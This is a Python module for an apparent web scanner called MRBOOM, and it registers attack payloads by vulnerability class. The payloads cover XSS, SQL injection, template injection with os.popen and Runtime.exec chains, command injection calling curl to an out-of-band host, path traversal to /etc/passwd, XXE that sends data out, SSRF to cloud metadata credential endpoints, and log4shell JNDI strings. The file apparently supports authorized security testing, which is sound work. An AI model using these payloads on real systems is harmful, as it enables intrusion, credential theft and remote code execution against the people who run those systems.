"""
MRBOOM // PAYLOADS — comprehensive attack payload library.
Central registry of detection/probe payloads per vuln class. Payloads are
marker-based (canary strings) for safe detection on authorized targets;
no destructive operations. Every payload returns a unique marker so hits
can be correlated back to the exact vector + position.

Classes: XSS, SQLi, SSTI, command injection, path traversal, LDAPi,
XXE, SSRF, open redirect, CRLF, prototype pollution, deserialization,
header injection, cache poisoning.

API:
  get(class, marker=None, context=None) -> list[str]
  iter_all() -> yields (vuln_class, tag, payload)
  markers_in(text) -> list of MRBM markers found in response text
"""
import re, itertools

MARKER_PREFIX = "MRBM"  # MrBOOM Marker — unique enough to avoid false positives
_marker_counter = itertools.count(1)

def new_marker(tag=""):
    return f"{MARKER_PREFIX}_{next(_marker_counter)}{'_' + re.sub(r'[^A-Za-z0-9]', '', tag)[:12] if tag else ''}"

# ─── XSS ───────────────────────────────────────────────────────────────
def xss_payloads(marker=None):
    m = marker or new_marker("xss")
    return [
        f'<script>window.__{m}=1</script>',
        f'"><script>window.__{m}=1</script>',
        f"'><script>window.__{m}=1</script>",
        f'<img src=x onerror=window.__{m}=1>',
        f'javascript:window.__{m}=1//',
        f'<svg onload=window.__{m}=1>',
        f'" autofocus onfocus=window.__{m}=1 x="',
        f'<details open ontoggle=window.__{m}=1>',
        f'<iframe src=javascript:window.__{m}=1>',
        f'{m}<script>window.__{m}=1</script>',          # reflection probe without tags
        f'<a href="javascript:window.__{m}=1">{m}</a>',
        f'<body onload=window.__{m}=1>',
        # DOM / sink probes
        f'{{"constructor":"alert({m})"}}',
        f'-alert(1)-{m}-',
        f'{m}{{{{7*7}}}}',                              # dual-use: reflection + SSTI probe
    ]

# ─── SQL INJECTION ─────────────────────────────────────────────────────
def sqli_payloads(marker=None):
    m = marker or new_marker("sqli")
    return [
        # error-based (distinct DB error fingerprints)
        "'",
        '"',
        "\\",
        "''",
        "' OR '1'='1",
        "' OR '1'='2",
        "1' ORDER BY 10--",
        "1 UNION SELECT NULL--",
        "1) UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        # boolean / arithmetic
        "1 AND 1=1",
        "1 AND 1=2",
        "1 AND 4242=4242",
        # time-based blind
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1 AND pg_sleep(5)--",
        "1) AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
        # stacked / fingerprint
        f"1; SELECT '{m}'--",
        f"' UNION SELECT '{m}'--",
        "1 OR 17-7=10",
        "admin'--",
        "' HAVING 1=1--",
        "' GROUP BY columnnames having 1:1--",
    ]

# ─── SSTI ──────────────────────────────────────────────────────────────
def ssti_payloads(marker=None):
    m = marker or new_marker("ssti")
    return [
        f"{m}{{{{7*7}}}}",                 # jinja2/twig -> 49
        f"{m}${{7*7}}",                    # freemarker/el -> 49
        f"{m}{{{{{{{{7*7}}}}}}}}",         # handlebars-style
        f"{m}<%= 7*7 %>",                  # erb/ejs -> 49
        f"{m}#{{7*7}}",                     # ruby string interp (server must compute 49)
        f"{m}#{{{{7*7}}}}",                 # ruby/mustache-style braces (server must compute 49)
        "${@java.lang.Runtime@getRuntime().exec('id')}",  # OGNL (Struts2) probe
        "{{7*7}}",
        "${7*7}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        f"{{{{'{m}'.__class__}}}}",        # jinja2 sandbox info-leak probe
        "=${7*7}",
    ]

# ─── COMMAND INJECTION ─────────────────────────────────────────────────
def cmdi_payloads(marker=None, oob_host=None):
    m = marker or new_marker("cmdi")
    ps = [
        f"{m};id",
        f"{m}|id",
        f"{m}&id",
        f"{m}&&id",
        f"{m}%0aid",
        f"{m}'id'",
        f"{m}`id`",
        f"{m}$(id)",
        f"{m};sleep 5",
        f"{m}|sleep 5",
        f"{m}&&ping -c 5 127.0.0.1",
        f"{m};ping -c 5 127.0.0.1",
        f"{m}$(sleep 5)",
        f"{m}`sleep 5`",
    ]
    if oob_host:
        ps += [
            f"{m};curl {oob_host}",
            f"{m}$(curl {oob_host})",
            f"{m}|nslookup {oob_host.replace('http://','').replace('https://','')}",
        ]
    return ps

# ─── PATH TRAVERSAL ────────────────────────────────────────────────────
def traversal_payloads(marker=None):
    m = marker or new_marker("lfi")
    return [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "....%2f....%2f....%2fetc%2fpasswd",
        "..\\..\\..\\windows\\win.ini",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd",
        "file:///etc/passwd",
        "....//....//etc/passwd",
        "....//....//....//proc/self/environ",
        "/proc/self/cmdline",
        f"../../../../../../../../etc/passwd%00{m}",
    ]

# ─── XXE ───────────────────────────────────────────────────────────────
def xxe_payloads(marker=None, oob_host=None):
    m = marker or new_marker("xxe")
    local = (
        f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        f'<r>&xxe;</r>'
    )
    ps = [local]
    if oob_host:
        ps.append(
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM '
            f'"{oob_host}/{m}"><!ENTITY % x "<!ENTITY send \'{oob_host}/?d=%d;\'>"]>'
            f"<r>&send;</r>"
        )
    return ps

# ─── SSRF ──────────────────────────────────────────────────────────────
def ssrf_payloads(marker=None, oob_host=None):
    m = marker or new_marker("ssrf")
    ps = [
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.tencentyun.com/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/",
        "http://0.0.0.0",
        "http://[::1]",
        "http://2130706433/",                    # 127.0.0.1 decimal
        "http://0x7f000001/",                    # 127.0.0.1 hex
        "http://127.1/",
        "http://127.0.1/",
        "http://①②⑦.⓪.⓪.①/",                    # unicode decimal bypass
        "http://localhost.nip.io/",
        "gopher://127.0.0.1:6379/_INFO",
        f"dict://127.0.0.1:6379/info {m}",
        "ftp://127.0.0.1",
        "file:///etc/passwd",
    ]
    if oob_host:
        ps.append(f"{oob_host}/{m}")
    return ps

# ─── OPEN REDIRECT ─────────────────────────────────────────────────────
def redirect_payloads(marker=None):
    m = marker or new_marker("redir")
    return [
        "https://evil.example.com/",
        "//evil.example.com/",
        "/\\evil.example.com/",
        "https:evil.example.com",
        "http:evil.example.com",
        "////evil.example.com",
        "https://evil.example.com%00",
        "%0d%0aLocation: https://evil.example.com",
        f"//{{{m}}}.evil.example.com/",
    ]

# ─── CRLF / HEADER INJECTION ───────────────────────────────────────────
def crlf_payloads(marker=None):
    m = marker or new_marker("crlf")
    return [
        f"%0d%0aSet-Cookie: {m}=1",
        f"%0d%0a{m}: injected",
        f"\r\nSet-Cookie: {m}=1",
        f"%0a{m}: injected",
        f"%E5%98%8D%E5%98%8A{m}: injected",       # unicode CRLF
        f"%0d%0aX-MRBOOM-{m}: true",
    ]

# ─── PROTOTYPE POLLUTION ───────────────────────────────────────────────
def prototype_payloads(marker=None):
    m = marker or new_marker("proto")
    return [
        f'{{"__proto__": {{"{m}": "polluted"}}}}',
        f'{{"constructor": {{"prototype": {{"{m}": "polluted"}}}}}}',
        f"__proto__[{m}]=polluted",
        f"constructor[prototype][{m}]=polluted",
    ]

# ─── DESERIALIZATION (detection markers only) ──────────────────────────
def deserialization_payloads(marker=None, oob_host=None):
    m = marker or new_marker("deser")
    ps = [
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3",  # java magic probe
        "aced0005",                                # java serialized prefix
        "K0k",                                     # .net type prefix probe
        "gAN9cQAu",                                # python pickle base64 probe
        f'{{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"{m}"}}',
    ]
    if oob_host:
        ps.append(f"${{jndi:ldap://{oob_host.replace('http://','').replace('https://','')}/{m}}}")  # log4shell probe
        ps.append(f"${{${{lower:j}}ndi:ldap://{oob_host.replace('http://','').replace('https://','')}/{m}}}")
    return ps

# ─── REGISTRY ──────────────────────────────────────────────────────────
REGISTRY = {
    "xss": xss_payloads,
    "sqli": sqli_payloads,
    "ssti": ssti_payloads,
    "cmdi": cmdi_payloads,
    "traversal": traversal_payloads,
    "xxe": xxe_payloads,
    "ssrf": ssrf_payloads,
    "redirect": redirect_payloads,
    "crlf": crlf_payloads,
    "prototype_pollution": prototype_payloads,
    "deserialization": deserialization_payloads,
}

def get(vuln_class, marker=None, context=None, oob_host=None):
    """Return payload list for a vuln class. Unknown class -> []."""
    fn = REGISTRY.get(vuln_class.lower())
    if not fn:
        return []
    kwargs = {}
    if oob_host and fn in (cmdi_payloads, xxe_payloads, ssrf_payloads, deserialization_payloads):
        kwargs["oob_host"] = oob_host
    try:
        return fn(marker=marker, **kwargs)
    except TypeError:
        return fn(marker=marker)

def iter_all(oob_host=None):
    """Yield (vuln_class, index, payload) across every class."""
    for cls, fn in REGISTRY.items():
        for i, p in enumerate(get(cls, oob_host=oob_host)):
            yield cls, i, p

_MARKER_RE = re.compile(re.escape(MARKER_PREFIX) + r"_\d+[A-Za-z0-9_]*")

def markers_in(text):
    """Find all MRBM markers present in a response body/header dump."""
    return list(dict.fromkeys(_MARKER_RE.findall(text or "")))

def classes():
    return sorted(REGISTRY.keys())

if __name__ == "__main__":
    import sys
    cls = sys.argv[1] if len(sys.argv) > 1 else None
    if cls and cls in REGISTRY:
        for p in get(cls):
            print(p)
    else:
        for c in classes():
            print(f"── {c} ({len(get(c))})")
            for p in get(c)[:5]:
                print(f"   {p}")
